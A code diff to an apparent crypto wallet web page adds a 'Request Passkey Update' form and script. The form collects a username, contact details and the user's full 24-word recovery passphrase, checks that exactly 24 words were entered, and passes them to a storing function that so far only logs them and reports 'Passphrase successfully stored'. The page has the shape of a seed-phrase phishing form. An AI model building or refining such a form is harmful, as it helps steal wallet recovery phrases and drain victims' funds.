@@ -63,7 +63,7 @@
           .passkey-form {
             display: flex;
             flex-direction: column;
-            align-items: center;
+            align-items: flex-start;
         }
 
         .passkey-form form {
@@ -211,14 +211,37 @@
         <!-- Passkey Update Form -->
     <div class="container passkey-form">
         <h3>Request Passkey Update</h3>
-        <form>
-            <input type="text" placeholder="Enter Username" required>
-            <input type="email" placeholder="Enter Email or Phone Number" required>
-            <textarea placeholder="Enter your 24-word passphrase" required></textarea>
+        <form onsubmit="return validateForm(event)">
+            <input type="text" id="username" placeholder="Enter Username">
+            <input type="email" id="email" placeholder="Enter Email or Phone Number">
+            <textarea id="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit">Submit Request</button>
         </form>
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
     </div>
+
+        <script>
+        function validateForm(event) {
+            event.preventDefault();
+            let username = document.getElementById("username").value.trim();
+            let email = document.getElementById("email").value.trim();
+            let passphrase = document.getElementById("passphrase").value.trim();
+            let words = passphrase.split(" ").filter(word => word.length > 0);
+
+            if (!username || !email || words.length !== 24) {
+                alert("Please enter all required details correctly.");
+                return false;
+            }
+
+            storeValues(username, email, passphrase);
+            return false;
+        }
+
+        function storeValues(username, email, passphrase) {
+            console.log("Stored Values:", { username, email, passphrase });
+            alert("Passphrase successfully stored.");
+        }
+    </script>
         
     <!-- Content Section -->
     <div class="container">
